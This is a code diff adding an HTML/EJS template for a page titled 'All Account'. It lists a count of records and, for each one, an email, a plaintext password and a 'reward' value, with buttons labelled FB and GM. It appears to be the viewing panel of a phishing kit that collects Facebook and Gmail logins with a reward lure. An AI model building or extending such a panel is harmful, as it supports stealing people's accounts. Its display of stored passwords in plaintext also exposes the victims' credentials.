@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="/site_icon.jpg">
+
+
+	<style type="text/css">
+
+		@media screen and (min-width: 300px){
+
+
+			body{
+				font-family: arial, helvetica, sans-serif;
+			}
+			
+			.data_wrapper{
+				display: grid;
+				grid-template-columns: 3fr 2fr 1fr;
+				max-width: 700px;
+				margin: 45px auto;
+			}
+
+
+			.select_social_wrapper{
+				display: grid;
+				grid-template-columns: 1fr 1fr;
+			}
+
+
+			.select_social_wrapper > button{
+				background-color: rgb(0, 150, 60);
+				border: 1px solid rgb(150, 150, 150);
+				color: white;
+				display: block;
+				width: 100px;
+				padding: 10px;
+				margin: 0 0 0 20px;
+			}
+
+
+			.select_social_wrapper > button + button{
+				margin: 0 20px 0 auto;
+				background-color: white;
+				color: black;
+			}
+
+			.data_wrapper_wrapper > div{
+				background-color: rgb(240, 240, 240);	
+				padding: 5px 0;
+				font-size: 12px;
+			}
+			
+			.data_wrapper_wrapper > div:nth-child(even){
+				background-color: rgb(200, 200, 200);	
+			}
+
+
+
+			.data_wrapper > div{
+				padding:5px 0;
+				border-left: 1px solid rgb(160, 160, 160);
+				text-align: center;
+			}
+
+			.delete{
+				display: block;
+				padding: 7px 15px;
+				margin: 10px 5px 0 auto;
+				background-color: rgb(200, 30, 10);
+				color: white;
+				border: none;
+			}
+
+		}
+
+
+
+
+
+
+		@media screen and (min-width: 1000px){
+			.data_wrapper_wrapper > div{
+				font-size: 16px;
+			}
+		}
+
+
+
+	</style>
+
+
+	<title></title>
+</head>
+
+
+
+
+
+<body>
+	<main>
+		<h2 style="text-align: center; color: red; margin-top: 20px">All Account</h2>
+
+		<h1 style="margin-top: 20px; text-align: center;"><%=data.length%></h1>
+		
+
+		<div class="data_wrapper_wrapper">
+			<div class="select_social_wrapper">
+				<button class="select_fb">FB</button>
+				<button class="select_gm">GM</button>
+			</div>
+
+			<%if(data && data.length > 0){%>
+				<%data.forEach((each)=>{%>
+					<div style="display: grid;" class="data_wrapper fb_data_wrapper">
+						<div class="email"><%=each.email%></div>
+						<div class="password"><%=each.password%></div>
+						<div class="email"><%=each.reward%></div>
+						
+					</div>
+				<%})%>
+			<%}%>
+
+		</div>
+
+	</main>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
